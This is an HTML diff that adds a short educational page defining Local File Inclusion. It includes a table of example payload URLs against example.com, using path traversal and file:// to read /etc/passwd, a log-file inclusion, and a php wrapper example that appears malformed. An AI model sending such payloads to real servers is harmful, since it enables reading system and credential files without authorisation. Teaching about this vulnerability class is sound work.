@@ -3,9 +3,50 @@
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Document</title>
+        <link rel="stylesheet" type="text/css" href="./css/style.css">
+        <title>Local File Inclusion</title>
     </head>
     <body>
-        
+        <header> <!-- describes the header section of the document which is on top -->
+            <center><h1>LFI - Vulnerabilities</h1></center> <!-- center semantic element centers content on the document -->
+            <nav></nav> <!-- creates the navigation section for the document -->
+        </header>
+        <main> <!-- This is used for the main content on the page, example, products being sold -->
+            <center>
+                <section> <!-- creates a section on the document for the content inside the element -->
+                    <h2>What is LFI</h2>
+                    <p style="width: 40%;">Local File Inclusion (LFI) allows an attacker to include files on a server through the web browser. This vulnerability exists when a web application includes a file without correctly sanitising the input, allowing and attacker to manipulate the input and inject path traversal characters and include other files from the web server.</p>
+                    <h4>Below are some examples of LFI usage</h4>
+                </section>
+            </center>
+            <center><table border="1"> <!-- creates a table on the document(columns and rows) -->
+                <thead>
+                    <tr>
+                        <th>Wrapper</th>
+                        <th>Example Usage</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>php://</td>
+                        <td>https://example.com/page=php://expect=ls</td>
+                    </tr>
+                    <tr>
+                        <td>file://</td>
+                        <td>https://example.com/page=file:///etc/passwd</td>
+                    </tr>
+                    <tr>
+                        <td>No Wrapper</td>
+                        <td>https://example.com/page=../../../etc/passwd</td>
+                    </tr>
+                    <tr>
+                        <td>No Wrapper</td>
+                        <td>https://example.com/page=/var/log/access.log</td>
+                    </tr>
+                </tbody>
+            </table></center>
+            
+        </main> 
+        <footer></footer> <!-- This you will find right at the bottom of the document, mostly used for quick links and copyright -->
     </body>
 </html>
